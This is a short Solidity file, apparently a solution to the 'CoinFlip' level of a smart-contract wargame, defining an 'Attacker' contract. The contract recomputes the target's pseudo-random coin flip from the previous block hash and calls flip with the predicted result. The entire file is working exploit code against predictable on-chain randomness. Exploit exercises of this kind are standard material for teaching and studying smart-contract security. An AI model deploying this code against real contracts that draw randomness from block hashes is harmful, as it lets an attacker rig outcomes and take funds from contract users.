//SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attacker {
    function attack(address _victim) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool guess = coinFlip == 1 ? true : false;
        ICoinFlip(_victim).flip(guess);
    }
}
